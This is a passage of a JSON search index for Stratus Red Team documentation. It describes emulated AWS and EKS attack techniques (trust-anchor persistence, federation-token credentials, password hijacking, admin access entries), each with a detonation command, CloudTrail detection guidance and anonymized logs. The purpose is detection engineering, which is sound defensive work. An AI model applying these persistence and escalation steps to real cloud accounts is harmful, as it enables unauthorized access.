</ol>"},{"location":"attack-techniques/AWS/aws.persistence.rolesanywhere-create-trust-anchor/","title":"Create an IAM Roles Anywhere trust anchor","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.rolesanywhere-create-trust-anchor/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.rolesanywhere-create-trust-anchor/#description","title":"Description","text":"<p>Establishes persistence by creating an IAM Roles Anywhere trust anchor.  The IAM Roles Anywhere service allows workloads that do not run in AWS to assume roles by presenting a client-side  X.509 certificate signed by a trusted certificate authority, called a \"trust anchor\".</p> <p>Assuming IAM Roles Anywhere is in use (i.e., that some of the IAM roles in the account have a  trust policy trusting  the IAM Roles Anywhere service), an attacker creating a trust anchor can subsequently assume these roles.</p> <p>Warm-up:</p> <ul> <li>Create an IAM role that can be used by IAM Roles Anywhere (see docs)</li> </ul> <p>Detonation: </p> <ul> <li>Create an IAM Roles Anywhere trust anchor</li> <li>Create an IAM Roles Anywhere profile</li> </ul> <p>References:</p> <ul> <li>https://docs.aws.amazon.com/rolesanywhere/latest/userguide/trust-model.html</li> <li>https://docs.aws.amazon.com/rolesanywhere/latest/userguide/getting-started.html</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.rolesanywhere-create-trust-anchor/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.rolesanywhere-create-trust-anchor\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.rolesanywhere-create-trust-anchor/#detection","title":"Detection","text":"<p>Identify when a trust anchor is created, through CloudTrail's <code>CreateTrustAnchor</code> event.</p>"},{"location":"attack-techniques/AWS/aws.persistence.rolesanywhere-create-trust-anchor/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>rolesanywhere:CreateProfile</code></p> </li> <li> <p><code>rolesanywhere:CreateTrustAnchor</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"cn-northsouth-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"66e5f252-e092-4ad0-9a33-a03595e05aca\",\n      \"eventName\": \"CreateTrustAnchor\",\n      \"eventSource\": \"rolesanywhere.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T13:56:39Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.10\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"791182566784\",\n      \"requestID\": \"4f8955b7-2a80-43c8-8f56-055883a07632\",\n      \"requestParameters\": {\n         \"enabled\": true,\n         \"name\": \"malicious-rolesanywhere-trust-anchor\",\n         \"source\": {\n            \"sourceData\": {\n               \"x509CertificateData\": \"-----BEGIN CERTIFICATE-----\\nMIIE3zCCAsegAwIBAgIJAOZLUn/n7YvYMA0GCSqGSIb3DQEBCwUAMA0xCzAJBgNV\\nBAYTAkVTMB4XDTIyMDcxMDIxMjgxOVoXDTMyMDcwNzIxMjgxOVowDTELMAkGA1UE\\nBhMCRVMwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDb0ga7LzegYNXV\\noBTY7ByNCtgqAEoZVQAEQAxpWzK4wL4V+TKRRGiP9KQSbMsU35dBuxzg2Ih62dwr\\nh6S7vYX4eU8YpGcutrWekzAl+G4GwfbHcwJYt9ALrneFUUWEedYA6BTVG0b+cwIL\\nOkVJSlB/4bAVFocwafdnFi3CLsIhXF/Yn90mnug+qsXSWPMZmTXaykiO9+AWV/pO\\n/JNS2WLPp4EKUT3CGm12TxBMHG0sWG0xopuj4KXTsyJFELDevSo92ldqyCIJFgG8\\nwBmbETxx9TlTPEU6hVkG4MLE2ekkEQK8WVLpZvTGFRrauawMhAzfFV9ZcgIsURy7\\nv2/FlYL7OedesimPfGD8M1dkm4yK2dVvUf/HyEL1IB1+3NtAOoifZ5jBBJKaybF0\\n/W85asZWVg+yKokFhmQRzu4BFnPhsoTwau+WuySYokbWIEzdW8FljWpwiPlvnqy+\\nVJVKdZuzWx12yLzK5srQ4Qcb/tQqkooVASM0PH5ts3PYlf5hRgxqKgCR5lXODxoA\\n0aylk6+wC2oBLhvufmwObsOMcxMbPv+EQvzYChL1MRLvEPAmATiE64ZLn8IOu9MG\\n9GRC6D/NkLy9LdsPWfzx+W1itrWR3ft/uD/HXILAVc54HejbZGsPsLe7qITDNc7n\\nD5zM+orgu67zgRaBOm1kPZbr/vHUFQIDAQABo0IwQDAOBgNVHQ8BAf8EBAMCAYYw\\nHQYDVR0OBBYEFJNT8WprixUiturSY9GAHXmAcP/RMA8GA1UdEwEB/wQFMAMBAf8w\\nDQYJKoZIhvcNAQELBQADggIBAJ1clg4GzHuMxTmpz+riL2klUZEMpJPvy682c0iH\\nNlG0f30cNHdSlnhCnx78h3n1xotSM8zZf6+LepCZWCzho5p3Fep7sDumQ+chgdIp\\nNApgcGX7tpx+TVjrrwkpxioMSfVFHJ7RMSewumnOXw4NsUQmGJdku8FUR7BWRRiY\\nfk0MoQ9nuwjt+RcSz/IKdFTzjI70nPikjSSd0L/ovWk5aXgLcnZpgzv6r4HbafJU\\n7dEnP+paZugEUts+SNXr3vkSuiLod7iiOcmQFvtRDFUAn4QonoN/6lDDOGLYsy0J\\nrv9GI+Y5VYt6JRGNJq/yCBV1KhhjaWll0kl/UNxIr+hBQ5Vul9SiR3jbbNlRh1PE\\nMPEAzhcqG8i3oZwwl62pjqPja+EvSuoPHf0tJ1rmjWmBt3irShSnuFN69+E4h20d\\n2cHVyF4GqF2VdNPYa0lh0cSIsNCJJ5+eyXRHKPcUCKI7pDYdbKZt+8ILlZC5PsSK\\nC0XsWIzqSG69Uqkm8c0P07NPmcAnGC3O92uhOrb4ytC2KyHVrNa+Bs6VYlYr3ayq\\n5AVfJZGuSxldlyM0N/peEKqz9vok4FoBxxSZGDi9ZDIMjLTpypHOMXi0d8YcClFO\\nlmRijJoUF95T+svxE60fdndPlleDKC8OnxvcIbS4OSK0ZqK1SFgTNaIgOniUSY6Q\\nV0KM\\n-----END CERTIFICATE-----\"\n            },\n            \"sourceType\": \"CERTIFICATE_BUNDLE\"\n         },\n         \"tags\": [\n            {\n               \"key\": \"HIDDEN_DUE_TO_SECURITY_REASONS\",\n               \"value\": \"HIDDEN_DUE_TO_SECURITY_REASONS\"\n            }\n         ]\n      },\n      \"responseElements\": {\n         \"trustAnchor\": {\n            \"createdAt\": \"2024-08-01T13:56:39.482702201Z\",\n            \"enabled\": true,\n            \"name\": \"malicious-rolesanywhere-trust-anchor\",\n            \"notificationSettings\": [\n               {\n                  \"channel\": \"ALL\",\n                  \"configuredBy\": \"rolesanywhere.amazonaws.com\",\n                  \"enabled\": true,\n                  \"event\": \"CA_CERTIFICATE_EXPIRY\",\n                  \"threshold\": 45\n               },\n               {\n                  \"channel\": \"ALL\",\n                  \"configuredBy\": \"rolesanywhere.amazonaws.com\",\n                  \"enabled\": true,\n                  \"event\": \"END_ENTITY_CERTIFICATE_EXPIRY\",\n                  \"threshold\": 45\n               }\n            ],\n            \"source\": {\n               \"sourceData\": {\n                  \"x509CertificateData\": \"-----BEGIN CERTIFICATE-----\\nMIIE3zCCAsegAwIBAgIJAOZLUn/n7YvYMA0GCSqGSIb3DQEBCwUAMA0xCzAJBgNV\\nBAYTAkVTMB4XDTIyMDcxMDIxMjgxOVoXDTMyMDcwNzIxMjgxOVowDTELMAkGA1UE\\nBhMCRVMwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDb0ga7LzegYNXV\\noBTY7ByNCtgqAEoZVQAEQAxpWzK4wL4V+TKRRGiP9KQSbMsU35dBuxzg2Ih62dwr\\nh6S7vYX4eU8YpGcutrWekzAl+G4GwfbHcwJYt9ALrneFUUWEedYA6BTVG0b+cwIL\\nOkVJSlB/4bAVFocwafdnFi3CLsIhXF/Yn90mnug+qsXSWPMZmTXaykiO9+AWV/pO\\n/JNS2WLPp4EKUT3CGm12TxBMHG0sWG0xopuj4KXTsyJFELDevSo92ldqyCIJFgG8\\nwBmbETxx9TlTPEU6hVkG4MLE2ekkEQK8WVLpZvTGFRrauawMhAzfFV9ZcgIsURy7\\nv2/FlYL7OedesimPfGD8M1dkm4yK2dVvUf/HyEL1IB1+3NtAOoifZ5jBBJKaybF0\\n/W85asZWVg+yKokFhmQRzu4BFnPhsoTwau+WuySYokbWIEzdW8FljWpwiPlvnqy+\\nVJVKdZuzWx12yLzK5srQ4Qcb/tQqkooVASM0PH5ts3PYlf5hRgxqKgCR5lXODxoA\\n0aylk6+wC2oBLhvufmwObsOMcxMbPv+EQvzYChL1MRLvEPAmATiE64ZLn8IOu9MG\\n9GRC6D/NkLy9LdsPWfzx+W1itrWR3ft/uD/HXILAVc54HejbZGsPsLe7qITDNc7n\\nD5zM+orgu67zgRaBOm1kPZbr/vHUFQIDAQABo0IwQDAOBgNVHQ8BAf8EBAMCAYYw\\nHQYDVR0OBBYEFJNT8WprixUiturSY9GAHXmAcP/RMA8GA1UdEwEB/wQFMAMBAf8w\\nDQYJKoZIhvcNAQELBQADggIBAJ1clg4GzHuMxTmpz+riL2klUZEMpJPvy682c0iH\\nNlG0f30cNHdSlnhCnx78h3n1xotSM8zZf6+LepCZWCzho5p3Fep7sDumQ+chgdIp\\nNApgcGX7tpx+TVjrrwkpxioMSfVFHJ7RMSewumnOXw4NsUQmGJdku8FUR7BWRRiY\\nfk0MoQ9nuwjt+RcSz/IKdFTzjI70nPikjSSd0L/ovWk5aXgLcnZpgzv6r4HbafJU\\n7dEnP+paZugEUts+SNXr3vkSuiLod7iiOcmQFvtRDFUAn4QonoN/6lDDOGLYsy0J\\nrv9GI+Y5VYt6JRGNJq/yCBV1KhhjaWll0kl/UNxIr+hBQ5Vul9SiR3jbbNlRh1PE\\nMPEAzhcqG8i3oZwwl62pjqPja+EvSuoPHf0tJ1rmjWmBt3irShSnuFN69+E4h20d\\n2cHVyF4GqF2VdNPYa0lh0cSIsNCJJ5+eyXRHKPcUCKI7pDYdbKZt+8ILlZC5PsSK\\nC0XsWIzqSG69Uqkm8c0P07NPmcAnGC3O92uhOrb4ytC2KyHVrNa+Bs6VYlYr3ayq\\n5AVfJZGuSxldlyM0N/peEKqz9vok4FoBxxSZGDi9ZDIMjLTpypHOMXi0d8YcClFO\\nlmRijJoUF95T+svxE60fdndPlleDKC8OnxvcIbS4OSK0ZqK1SFgTNaIgOniUSY6Q\\nV0KM\\n-----END CERTIFICATE-----\\n\"\n               },\n               \"sourceType\": \"CERTIFICATE_BUNDLE\"\n            },\n            \"trustAnchorArn\": \"arn:aws:rolesanywhere:cn-northsouth-3r:791182566784:trust-anchor/4d07f6a0-1c50-44d3-951b-b68b783daa0a\",\n            \"trustAnchorId\": \"4d07f6a0-1c50-44d3-951b-b68b783daa0a\",\n            \"updatedAt\": \"2024-08-01T13:56:39.482702201Z\"\n         }\n      },\n      \"sourceIPAddress\": \"221.252.237.0\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"rolesanywhere.cn-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e2e652c1-ed4b-4402-b3b0-136ef4c9ace7\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA3SBEM4QSKES6Z5F9\",\n         \"accountId\": \"791182566784\",\n         \"arn\": \"arn:aws:iam::791182566784:user/christophe\",\n         \"principalId\": \"AIDADMWJD73A3SNMRPEY\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-northsouth-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"aebbe7b5-7cfb-4b00-a30c-48078fedffd8\",\n      \"eventName\": \"CreateProfile\",\n      \"eventSource\": \"rolesanywhere.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T13:56:39Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.10\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"791182566784\",\n      \"requestID\": \"4f6be2aa-b5b3-4f95-bad6-5751f3904fbf\",\n      \"requestParameters\": {\n         \"durationSeconds\": 3600,\n         \"enabled\": true,\n         \"name\": \"malicious-rolesanywhere-profile\",\n         \"roleArns\": [\n            \"arn:aws:iam::791182566784:role/stratus-red-team-trust-anchor-role\"\n         ],\n         \"tags\": [\n            {\n               \"key\": \"HIDDEN_DUE_TO_SECURITY_REASONS\",\n               \"value\": \"HIDDEN_DUE_TO_SECURITY_REASONS\"\n            }\n         ]\n      },\n      \"responseElements\": {\n         \"profile\": {\n            \"acceptRoleSessionName\": false,\n            \"attributeMappings\": [\n               {\n                  \"certificateField\": \"x509Issuer\",\n                  \"mappingRules\": [\n                     {\n                        \"specifier\": \"*\"\n                     }\n                  ]\n               },\n               {\n                  \"certificateField\": \"x509SAN\",\n                  \"mappingRules\": [\n                     {\n                        \"specifier\": \"DNS\"\n                     },\n                     {\n                        \"specifier\": \"URI\"\n                     },\n                     {\n                        \"specifier\": \"Name/*\"\n                     }\n                  ]\n               },\n               {\n                  \"certificateField\": \"x509Subject\",\n                  \"mappingRules\": [\n                     {\n                        \"specifier\": \"*\"\n                     }\n                  ]\n               }\n            ],\n            \"createdAt\": \"2024-08-01T13:56:39.832628281Z\",\n            \"createdBy\": \"arn:aws:iam::791182566784:user/christophe\",\n            \"durationSeconds\": 3600,\n            \"enabled\": true,\n            \"name\": \"malicious-rolesanywhere-profile\",\n            \"profileArn\": \"arn:aws:rolesanywhere:cn-northsouth-3r:791182566784:profile/910042eb-8463-427d-8095-6fd60ac303d9\",\n            \"profileId\": \"910042eb-8463-427d-8095-6fd60ac303d9\",\n            \"roleArns\": [\n               \"arn:aws:iam::791182566784:role/stratus-red-team-trust-anchor-role\"\n            ],\n            \"updatedAt\": \"2024-08-01T13:56:39.832628281Z\"\n         }\n      },\n      \"sourceIPAddress\": \"221.252.237.0\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"rolesanywhere.cn-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e2e652c1-ed4b-4402-b3b0-136ef4c9ace7\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA3SBEM4QSKES6Z5F9\",\n         \"accountId\": \"791182566784\",\n         \"arn\": \"arn:aws:iam::791182566784:user/christophe\",\n         \"principalId\": \"AIDADMWJD73A3SNMRPEY\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.persistence.sts-federation-token/","title":"Generate temporary AWS credentials using GetFederationToken","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.sts-federation-token/#mappings","title":"Mappings","text":"<ul> <li> <p>MITRE ATT&amp;CK</p> <ul> <li>Persistence</li> </ul> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Account Manipulation: Additional Cloud Credentials (T1098.001)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.sts-federation-token/#description","title":"Description","text":"<p>Establishes persistence by generating new AWS temporary credentials through <code>sts:GetFederationToken</code>. The resulting credentials remain functional even if the original access keys are disabled.</p> <p>Warm-up: </p> <ul> <li>Create an IAM user and generate a pair of access keys.</li> </ul> <p>Detonation: </p> <ul> <li>Use the access keys from the IAM user to request temporary security credentials via <code>sts:GetFederationToken</code>.</li> <li>Call <code>sts:GetCallerIdentity</code> using these new credentials.</li> </ul> <p>References:</p> <ul> <li>https://docs.aws.amazon.com/STS/latest/APIReference/API_GetFederationToken.html</li> <li>https://www.crowdstrike.com/en-us/blog/how-adversaries-persist-with-aws-user-federation/</li> <li>https://reinforce.awsevents.com/content/dam/reinforce/2024/slides/TDR432_New-tactics-and-techniques-for-proactive-threat-detection.pdf</li> <li>https://fwdcloudsec.org/assets/presentations/2024/europe/sebastian-walla-cloud-conscious-tactics-techniques-and-procedures-an-overview.pdf</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.sts-federation-token/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.sts-federation-token\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.sts-federation-token/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>GetFederationToken</code> event.</p>"},{"location":"attack-techniques/AWS/aws.persistence.sts-federation-token/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>sts:GetCallerIdentity</code></p> </li> <li> <p><code>sts:GetFederationToken</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"ap-isob-east-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"6e882b9d-2af8-4c67-b91f-aeac6a0e5e70\",\n      \"eventName\": \"GetFederationToken\",\n      \"eventSource\": \"sts.amazonaws.com\",\n      \"eventTime\": \"2024-11-30T08:43:17Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"742491224508\",\n      \"requestID\": \"e2de7fd1-2a86-4837-b15a-96fff1388061\",\n      \"requestParameters\": {\n         \"name\": \"stratus_red_team\",\n         \"policy\": \"{\\n\\t\\t\\\"Version\\\": \\\"2012-10-17\\\",\\n\\t\\t\\\"Statement\\\": [\\n\\t\\t\\t{\\n\\t\\t\\t\\t\\\"Effect\\\": \\\"Allow\\\",\\n\\t\\t\\t\\t\\\"Action\\\": \\\"*\\\",\\n\\t\\t\\t\\t\\\"Resource\\\": \\\"*\\\"\\n\\t\\t\\t}\\n\\t\\t]\\n\\t}\"\n      },\n      \"responseElements\": {\n         \"credentials\": {\n            \"accessKeyId\": \"ASIASTJKC5GCM7ZE6LUP\",\n            \"expiration\": \"Nov 30, 2024, 8:43:17 PM\",\n            \"sessionToken\": \"IQoJb3JpZ2luX2VjEOH//////////wEaCXVzLWVhc3QtMSJIMEYCIQDzpomGZAmkp4RIzBo4RqVJGEmUNjyA7lHyt1aKfFh8IwIhANX6aS3XpNU319gOolVjEBkNLRmu9dyO8FqoDW5y+HL4KqICCIr//////////wEQABoMMzQ1NTk0NjA3OTQ5IgykqzjqIZ5pQXZgeDEq9gGg9Law7M5zzj/fSvNlo2pgdgHCmA6UW8IevbwXiKbLO5y0dg/sdhsaEUaOvl6i2Fu+xF2p3dvI8SuCJSTH5PEC2ZRgX1TPhzh+0xN7CsCQG2diBitgDQSs+E3P9ED4xDVuTCE9H8IIS/2BuksBI9bQ3z2itKRkVmkC+xpsfyFc98vX0ZLSUKOIpx+iaDNrhiW85Cyt6ezNEyLfX3bukmmIdVIZQ+Tb4tYLvIRKIyp6OFiA3BL48K7nfIAd1EzDhGnlvkZN/70hDxYt8hTKehNXDs2FVKY5u96z0zhsnNGcuhHHa7OEOKg5lLL5QuEzjx6JA+e9qaQwpaCrugY6mAFp1LZ4E15PVqImPSC/wtr+rEU4Dnp+1/6+PNkbxvxYXfqZOfJxRkZtgWtmV7iWapGzA/pVedD4vuHci4Kq2NUTuyA8L7BeKSaEq0FqFi1yrfCYjYsGI3ncxMQQddgiXVXeoWY4c4auGvAHgiJI/PDQPsaa3Sle/gGnok53u8NfNYoBRtASGaJJtGS0ylDxsQVe9InwBxoJnQ==\"\n         },\n         \"federatedUser\": {\n            \"arn\": \"arn:aws:sts::742491224508:federated-user/stratus_red_team\",\n            \"federatedUserId\": \"742491224508:stratus_red_team\"\n         },\n         \"packedPolicySize\": 4\n      },\n      \"sourceIPAddress\": \"255.090.254.5\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"sts.ap-isob-east-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"aws-sdk-go-v2/1.32.3 os/linux lang/go#1.23.1 md/GOOS#linux md/GOARCH#amd64 exec-env/grimoire_095724e3-1fa0-4e3e-b68a-e8581d194380 api/sts#1.26.2\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA6V1GNZTT65XQH36M\",\n         \"accountId\": \"742491224508\",\n         \"arn\": \"arn:aws:iam::742491224508:user/stratus-red-team-user-federation-user\",\n         \"principalId\": \"AIDAN7SEM6PEVTNQR8M4\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"stratus-red-team-user-federation-user\"\n      }\n   },\n   {\n      \"awsRegion\": \"ap-isob-east-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"91529247-c4c4-4793-afc8-d70bbcfe9d19\",\n      \"eventName\": \"GetCallerIdentity\",\n      \"eventSource\": \"sts.amazonaws.com\",\n      \"eventTime\": \"2024-11-30T08:43:18Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"742491224508\",\n      \"requestID\": \"037be419-9e9f-42e0-a38f-2a5d2ae1ce65\",\n      \"requestParameters\": null,\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.090.254.5\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"sts.ap-isob-east-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"aws-sdk-go-v2/1.32.3 os/linux lang/go#1.23.1 md/GOOS#linux md/GOARCH#amd64 exec-env/grimoire_095724e3-1fa0-4e3e-b68a-e8581d194380 api/sts#1.26.2\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIASTJKC5GCM7ZE6LUP\",\n         \"accountId\": \"742491224508\",\n         \"arn\": \"arn:aws:sts::742491224508:federated-user/stratus_red_team\",\n         \"principalId\": \"742491224508:stratus_red_team\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-11-30T08:43:17Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"742491224508\",\n               \"arn\": \"arn:aws:iam::742491224508:user/stratus-red-team-user-federation-user\",\n               \"principalId\": \"AIDAN7SEM6PEVTNQR8M4\",\n               \"type\": \"IAMUser\",\n               \"userName\": \"stratus-red-team-user-federation-user\"\n            },\n            \"webIdFederationData\": {}\n         },\n         \"type\": \"FederatedUser\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.privilege-escalation.iam-update-user-login-profile/","title":"Change IAM user password","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.privilege-escalation.iam-update-user-login-profile/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Privilege Escalation</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.privilege-escalation.iam-update-user-login-profile/#description","title":"Description","text":"<p>Establishes persistence by updating a Login Profile on an existing IAM user to change its password. This allows an attacker to hijack  an IAM user with an existing login profile.</p> <p>Warm-up:</p> <ul> <li>Create an IAM user with a login profile</li> </ul> <p>Detonation: </p> <ul> <li>Update the user's login profile to change its password</li> </ul> <p>References:</p> <ul> <li>https://www.invictus-ir.com/news/the-curious-case-of-dangerdev-protonmail-me</li> <li>https://expel.com/blog/incident-report-from-cli-to-console-chasing-an-attacker-in-aws/</li> <li>https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud</li> </ul>"},{"location":"attack-techniques/AWS/aws.privilege-escalation.iam-update-user-login-profile/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.privilege-escalation.iam-update-user-login-profile\n</code></pre>"},{"location":"attack-techniques/AWS/aws.privilege-escalation.iam-update-user-login-profile/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>UpdateLoginProfile</code> events.</p>"},{"location":"attack-techniques/AWS/aws.privilege-escalation.iam-update-user-login-profile/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>iam:UpdateLoginProfile</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"megov-southcentral-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"a46a1a42-9ef1-48d4-9c61-507eb6d4019f\",\n      \"eventName\": \"UpdateLoginProfile\",\n      \"eventSource\": \"iam.amazonaws.com\",\n      \"eventTime\": \"2024-08-28T09:54:40Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"763751499319\",\n      \"requestID\": \"bd8967e5-b80d-48cd-b8b5-45c9905a4a7f\",\n      \"requestParameters\": {\n         \"userName\": \"stratus-red-team-update-login-profile-user\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"212.3.253.233\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"iam.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_33d1bcd6-0716-4e7f-a145-8a75625cf180\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAV1MIS7NGMDMR83FC\",\n         \"accountId\": \"763751499319\",\n         \"arn\": \"arn:aws:iam::763751499319:user/christophe\",\n         \"principalId\": \"AIDAXYBG3LDVX65FGD9O\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/EKS/","title":"EKS","text":"<p>This page contains the Stratus attack techniques for EKS, grouped by MITRE ATT&amp;CK Tactic. Note that some Stratus attack techniques may correspond to more than a single ATT&amp;CK Tactic.</p>"},{"location":"attack-techniques/EKS/#persistence","title":"Persistence","text":"<ul> <li>Backdoor aws-auth EKS ConfigMap</li> </ul>"},{"location":"attack-techniques/EKS/#privilege-escalation","title":"Privilege Escalation","text":"<ul> <li>Backdoor aws-auth EKS ConfigMap</li> </ul>"},{"location":"attack-techniques/EKS/#lateral-movement","title":"Lateral Movement","text":"<ul> <li>Create Admin EKS Access Entry</li> </ul>"},{"location":"attack-techniques/EKS/eks.lateral-movement.create-access-entry/","title":"Create Admin EKS Access Entry","text":"<p>Platform: EKS</p>"},{"location":"attack-techniques/EKS/eks.lateral-movement.create-access-entry/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Lateral Movement</li> </ul> </li> </ul>"},{"location":"attack-techniques/EKS/eks.lateral-movement.create-access-entry/#description","title":"Description","text":"<p>Uses the EKS Cluster Access Management to assign cluster administrator privileges to an IAM role. This allows the role to perform any action inside the Kubernetes cluster.</p> <p>Warm-up:</p> <ul> <li>Create an IAM role</li> </ul> <p>Detonation:</p> <ul> <li>Create an access entry for the IAM role</li> <li>Associate the access entry with the AmazonEKSClusterAdminPolicy access policy</li> </ul> <p>References: </p> <ul> <li>https://securitylabs.datadoghq.com/articles/eks-cluster-access-management-deep-dive/</li> <li>https://docs.aws.amazon.com/eks/latest/userguide/access-entries.html</li> </ul>"},{"location":"attack-techniques/EKS/eks.lateral-movement.create-access-entry/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate eks.lateral-movement.create-access-entry\n</code></pre>"},{"location":"attack-techniques/EKS/eks.lateral-movement.create-access-entry/#detection","title":"Detection","text":"<p>You can use the following CloudTrail events to identify when someone grants access to your EKS cluster:</p> <ul> <li>CreateAccessEntry, when someone creates an access entry for a principal (meaning it's the first this principal is granted privileges in the cluster)':</li> </ul> <pre><code>{\n    \"eventSource\": \"eks.amazonaws.com\",\n    \"eventName\": \"CreateAccessEntry\",\n    \"requestParameters\": {\n        \"name\": \"eks-cluster\",\n        \"principalArn\": \"arn:aws:iam::012345678901:role/stratus-red-team-eks-create-access-entry-role\"\n    },\n    \"responseElements\": {\n        \"accessEntry\": {\n            \"clusterName\": \"eks-cluster\",\n            \"type\": \"STANDARD\",\n            \"principalArn\": \"arn:aws:iam::012345678901:role/stratus-red-team-eks-create-access-entry-role\",\n        }\n    }\n}\n</code></pre> <ul> <li>AssociateAccessPolicy: when someone assigns an access policy to a principal</li> </ul> <pre><code>{\n  \"eventSource\": \"eks.amazonaws.com\",\n  \"eventName\": \"AssociateAccessPolicy\",\n  \"requestParameters\": {\n    \"policyArn\": \"arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy\",\n    \"accessScope\": {\n      \"type\": \"cluster\"\n    },\n    \"name\": \"eks-cluster\",\n    \"principalArn\": \"arn%3Aaws%3Aiam%3A%3A012345678901%3Arole%2Fstratus-red-team-eks-create-access-entry-role\"\n  